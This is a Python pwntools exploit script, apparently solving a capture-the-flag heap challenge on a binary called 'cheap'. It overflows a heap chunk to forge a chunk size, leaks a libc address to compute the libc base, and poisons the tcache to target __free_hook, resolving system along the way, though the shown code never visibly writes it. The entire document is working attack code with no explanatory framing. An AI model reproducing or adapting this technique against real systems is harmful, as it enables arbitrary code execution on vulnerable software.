#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./cheap")
p = process("./cheap")
gdb.attach(p,"init-pwndbg")
libc = ELF("libc.so.6")

def create(size, data):
    p.sendline("1")
    p.sendlineafter(": ", str(size))
    p.sendlineafter(": ", data)
    p.recvuntil("Choice: ")


def free():
    p.sendline("3")
    p.recvuntil("Choice: ")


def show():
    p.sendline("2")
    LEAK = p.recvuntil("1. create", drop=True)
    p.recvuntil("Choice: ")
    return LEAK

create(0x38,"a"*8)
free()
create(0x328,"b"*8)
free()
create(0xf8,"c"*8)
free()
create(0x40,"d"*8)
create(0x38,b"a"*48+p64(0x0)+p64(0x431))
create(0x328,"0"*8)
free()
leak = show()[:-1]
leak = leak.ljust(8,b"\x00")
leak = u64(leak)
libc.address = leak-0x1ecbe0
log.critical("Libc base address: {}".format(hex(libc.address)))
__free_hook = libc.address + 0x1eee48
system = libc.sym.system
create(0x28,"a"*8)
free()
create(0x38,"b"*8)
free()
create(0x28,b"a"*32+p64(0x0)+p64(0x41)+p64(__free_hook)+b"a"*8)
create(0x38,b"a"*48)
create(0x38,b"b"*48)
free()
p.interactive()